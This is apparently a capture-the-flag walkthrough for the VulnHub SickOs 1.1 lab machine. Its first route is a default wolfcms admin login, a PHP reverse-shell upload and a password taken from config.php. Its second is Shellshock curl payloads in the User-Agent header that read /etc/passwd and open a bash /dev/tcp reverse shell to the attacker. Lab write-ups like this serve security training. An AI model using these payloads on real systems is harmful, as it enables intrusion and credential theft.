# SickOs: 1.1

https://www.vulnhub.com/entry/sickos-11,132/


We do a netdiscover to find IP ` 192.168.1.91` and run a typical nmap scan `nmap -p 1-65535 -sV -sS -T4 192.168.1.91`. There is a squid-http which is a caching proxy and we can connect it by manually configuring firefox > network to accept `HTTP Proxy: 192.168.1.91 and Port: 3128`. We visit http://192.168.1.91/ and get a message "BLEHHH!!!". Now there are a couple of ways to get access.

### 1. wolfcms default admin

We can use nikto to use a proxy (remember to do it with other tools as well)`nikto -h 192.168.1.91 --useproxy 192.168.1.91:3128` and also `gobuster -u http://192.168.1.91/ -f -e -x html,jpg,css,txt,png,gif,lock,zip,git,php -w /usr/share/wordlists/dirb/common.txt -p http://192.168.1.91:3128`. We see the robots.txt leads to a `/wolfcms`, so we visit `http://192.168.1.91/wolfcms/` to find a blog of some sort. Similarly, we run the nikto and gobuster again, but didn't find anything interesting. Also tried `dirb http://192.168.1.91/wolfcms/ /usr/share/wordlists/dirb/common.txt -p http://192.168.1.91:3128`. Browsing through the site just seems to be all static resources, but there seems to be some post made by the administrator, but we cannot find the login page. We google this (e.g. wolfcms admin page) and told that the login maybe at `http://127.0.0.1/wolfcms/?admin`. We test admin:admin and it works.

From here, we can upload a shell in the public folder and access it via `http://192.168.1.91/wolfcms/public/php-reverse-shell.php` (make sure to edit the php file with the the attacker's vm IP and remember the port (default is 1234). Then, in our attack vm, we run listen via `nc -nlvp 1234` and visit the link again which should give us a shell. You can then find `uname -a` and find vulnerabilities through something like exploit-db and upload the exploit via the upload function and then execute it via shell. Or we can `cd /var/www/wolfcm` and `cat config.php` to find the passwords `root:john@123`. We then need to spawn a [TTY Shell](https://netsec.ws/?p=337) by running `python -c 'import pty; pty.spawn("/bin/sh")'` then `su sickos` found in `/etc/groups` and find the flag in `/root` folder! Note that the pass did not work for root, which meant to iterating through the users. But looking at the groups, we can see certain admins with sickos.



### 2. Shellshock
Looking back at nikto, we see a shellshock vulnerability.

```
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
```
We check `http://192.168.1.91/cgi-bin/status` to see it returns a JSON which is normally the output of some bash commands. Shellshock works by manipulation of the environment variable, which can be injected in the HTTP header. Using some shellshock code we can find online, we run `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \ 192.168.1.91/cgi-bin/status -v --proxy 192.168.1.91:3128` to read execute commands. Instead, we do a reverse shell with `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.88/1234 0>&1'" \ 192.168.1.91/cgi-bin/status -v --proxy 192.168.1.91:3128`. Make sure that you are already listening on your attacker machine `nc -nlvp 1234`, and then we can repeat the steps we did on the first example.
